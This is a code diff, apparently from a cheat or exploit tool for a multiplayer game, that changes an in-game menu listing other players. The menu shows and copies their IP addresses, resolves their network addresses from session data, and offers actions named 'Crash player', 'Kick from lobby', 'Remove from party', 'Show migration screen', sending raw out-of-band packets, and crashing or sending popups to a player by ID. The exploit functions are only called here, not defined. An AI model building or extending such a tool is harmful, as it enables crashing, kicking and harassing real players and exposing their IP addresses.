@@ -109,18 +109,27 @@ namespace menu
 		ImGui::TextUnformatted(text.data());
 		return true;
 	}
+	
+	game::netadr_t get_net_adr(const game::XSESSION_INFO& info)
+	{
+		game::netadr_t netadr{};
+		game::dwRegisterSecIDAndKey(&info.sessionID, &info.keyExchangeKey);
+		game::dwCommonAddrToNetadr(&netadr, &info.hostAddress, &info.sessionID);
 
+		return netadr;
+	}
+	
 	void draw_player_list(const float width, const float spacing)
 	{
+		const auto session{ game::session };
+
+		if (session == nullptr)
+		{
+			return;
+		}
+		
 		if (ImGui::BeginTabItem("Player List"))
 		{
-			const auto session{ game::session };
-
-			if (session == nullptr)
-			{
-				return;
-			}
-			
 			ImGui::PushStyleVar(ImGuiStyleVar_IndentSpacing, 0.0f);
 			ImGui::BeginColumns("Players", 3, ImGuiColumnsFlags_NoResize);
 
@@ -135,7 +144,7 @@ namespace menu
 
 			ImGui::Separator();
 
-			std::array<std::uint32_t, 18> indices = {};
+			std::array<size_t, 18> indices{};
 
 			for (size_t i = 0; i < 18; ++i)
 			{
@@ -153,8 +162,8 @@ namespace menu
 
 					ImGui::NextColumn();
 
-					const auto player_xuid{ target_client->activeClient->xuid };
-					const auto player_name{ target_client->activeClient->gamertag };
+					const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
+					const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };
 
 					ImGui::PushStyleColor(ImGuiCol_Text, game::LiveUser_IsXUIDLocalPlayer(player_xuid)
 						? ImColor(0, 255, 127, 250).Value : ImColor(200, 200, 200, 250).Value);
@@ -166,9 +175,8 @@ namespace menu
 					ImGui::PopStyleColor();
 
 					const auto netadr{ target_client->activeClient->sessionInfo[session->type].netAdr };
-					const auto is_bot{ netadr.type == game::NA_BOT };
 
-					if (is_bot)
+					if (netadr.type == game::NA_BOT)
 					{
 						ImGui::SameLine(0, spacing);
 
@@ -181,11 +189,8 @@ namespace menu
 					if (selected)
 					{
 						friend_player_name = player_name;
-
 						ImGui::OpenPopup(popup.data());
 					}
-
-					const auto ip_string{ utils::string::adr_to_string(&netadr) };
 					
 					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
 					{
@@ -225,34 +230,43 @@ namespace menu
 						{
 							ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
 						}
-
-						if (ImGui::MenuItem(ip_string))
+						
+						const auto is_netadr_valid{ netadr.inaddr && netadr.type != game::NA_BAD };
+						const auto ip_string{ is_netadr_valid ? utils::string::adr_to_string(&netadr) : "Invalid IP Data" };
+						
+						if (ImGui::MenuItem(ip_string, nullptr, nullptr, is_netadr_valid))
 						{
 							ImGui::LogToClipboardUnformatted(ip_string);
 						}
 
 						ImGui::Separator();
 
-						if (ImGui::MenuItem("Crash player", nullptr, nullptr, !is_bot))
+						if (ImGui::MenuItem("Crash player"))
 						{
 							exploit::instant_message::send_info_response_overflow(player_xuid);
 
-							exploit::send_crash(netadr);
+							if(is_netadr_valid)
+								exploit::send_crash(netadr);
 						}
 
-						if (ImGui::BeginMenu("Exploits##" + std::to_string(client_num), !is_bot))
+						if (ImGui::BeginMenu("Exploits##" + std::to_string(client_num)))
 						{
-							if (ImGui::MenuItem("Show migration screen"))
+							if (ImGui::MenuItem("Remove from party"))
+							{
+								exploit::lobby_msg::send_disconnect_client(player_xuid);
+							}
+							
+							if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, is_netadr_valid))
 							{
 								exploit::send_mstart_packet(netadr);
 							}
-
-							if (ImGui::MenuItem("Kick from lobby"))
+							
+							if (ImGui::MenuItem("Kick from lobby", nullptr, nullptr, is_netadr_valid))
 							{
 								exploit::send_connect_response_migration_packet(netadr);
 							}
 
-							if (ImGui::BeginMenu("Send OOB##" + std::to_string(client_num)))
+							if (ImGui::BeginMenu("Send OOB##" + std::to_string(client_num), is_netadr_valid))
 							{
 								static auto string_input{ ""s };
 
@@ -312,8 +326,8 @@ namespace menu
 
 				if (ImGui::BeginTabItem("Misc"))
 				{
-					ImGui::Checkbox("Log out-of-band packets", &events::connectionless_packet::log_packets); 
-					ImGui::Checkbox("Log instant messages", &events::instant_message::dispatch::log_messages);
+					ImGui::Checkbox("Log out-of-band packets", &events::connectionless_packet::log_commands); 
+					ImGui::Checkbox("Log instant messages", &events::instant_message::log_messages);
 					ImGui::Checkbox("Log lobby messages", &events::lobby_msg::log_messages);
 					
 					if (ImGui::CollapsingHeader("Exploits", ImGuiTreeNodeFlags_Leaf))
@@ -321,26 +335,18 @@ namespace menu
 						static auto steam_id_input{ ""s };
 
 						ImGui::SetNextItemWidth(width * 0.85f);
-						ImGui::InputTextWithHint("##target_steam_id", "ID", &steam_id_input);
+						ImGui::InputTextWithHint("##target_id", "ID", &steam_id_input);
 
-						const auto target_steam_id{ utils::atoll(steam_id_input) };
+						const auto target_id{ utils::atoll(steam_id_input) };
 
-						if (ImGui::MenuItem("Send crash", nullptr, nullptr, target_steam_id && !steam_id_input.empty()))
+						if (ImGui::MenuItem("Send crash", nullptr, nullptr, target_id && !steam_id_input.empty()))
 						{
-							exploit::instant_message::send_info_response_overflow(target_steam_id);
+							exploit::instant_message::send_info_response_overflow(target_id);
 						}
 
-						if (ImGui::MenuItem("Send popup", nullptr, nullptr, target_steam_id && !steam_id_input.empty()))
+						if (ImGui::MenuItem("Send popup", nullptr, nullptr, target_id && !steam_id_input.empty()))
 						{
-							exploit::instant_message::send_popup(target_steam_id);
-						}
-
-						if (ImGui::MenuItem("Send IQ", nullptr, nullptr, target_steam_id && !steam_id_input.empty()))
-						{
-							std::vector<std::uint64_t> recipients;
-							recipients.emplace_back(target_steam_id);
-							
-							events::instant_message::send_info_request(recipients);
+							exploit::instant_message::send_popup(target_id);
 						}
 					}
 					
